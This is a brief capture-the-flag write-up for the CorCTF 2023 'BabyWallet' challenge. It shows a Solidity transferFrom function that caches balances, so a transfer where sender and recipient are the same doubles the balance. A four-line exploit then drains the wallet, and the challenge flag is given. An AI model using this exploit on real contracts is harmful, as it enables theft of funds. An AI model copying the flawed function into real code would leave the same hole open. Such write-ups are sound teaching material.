# CorCTF 2023

## BabyWallet

The following `transferFrom` is vulnerable if `from == to`.

```solidity
function transferFrom(address from, address to, uint256 amt) public {
    uint256 allowedAmt = allowances[from][msg.sender];
    uint256 fromBalance = balances[from];
    uint256 toBalance = balances[to];

    require(fromBalance >= amt, "You can't transfer that much");
    require(allowedAmt >= amt, "You don't have approval for that amount");

    balances[from] = fromBalance - amt;
    balances[to] = toBalance + amt;
    allowances[from][msg.sender] = allowedAmt - amt;
}
```

Exploit:

```solidity
wallet.deposit{value: 100 ether}();
wallet.approve(address(this), 100 ether);
wallet.transferFrom(address(this), address(this), 100 ether);
wallet.withdraw(200 ether);
```

Flag: `corctf{inf1nite_m0ney_glitch!!!}`
